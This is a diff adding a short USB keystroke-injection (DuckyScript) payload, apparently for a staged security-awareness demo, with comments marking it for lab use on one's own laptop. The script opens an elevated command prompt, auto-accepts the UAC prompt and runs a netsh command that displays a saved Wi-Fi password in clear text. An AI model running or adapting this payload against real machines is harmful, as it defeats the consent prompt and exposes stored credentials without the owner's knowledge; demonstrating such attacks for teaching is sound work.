@@ -1,0 +1,27 @@
+REM ============================================================
+REM LAB USE ONLY - authorized demo on your own laptop
+REM ============================================================
+REM Fallback for live_wifi_key_reveal_windows.txt. Some Windows
+REM 11 builds answer key=clear with an elevation demand. This
+REM variant opens an ELEVATED cmd: UAC consent via ALT+y, then
+REM the same display-only netsh line.
+REM
+REM It only works when the demo account is a local admin. If it
+REM does, say so on stage: the sacrificial laptop running as
+REM admin is itself a finding for the room.
+REM
+REM Rehearse BOTH variants on the actual demo laptop. Keep only
+REM the one that works on the SD card. If the laptop is slow,
+REM bump the two 1500 ms delays to 2500.
+REM ============================================================
+
+DELAY 2000
+GUI r
+DELAY 500
+STRING cmd
+CTRL SHIFT ENTER
+DELAY 1500
+ALT y
+DELAY 1500
+STRING netsh wlan show profile name="LAB_SSID_HERE" key=clear
+ENTER
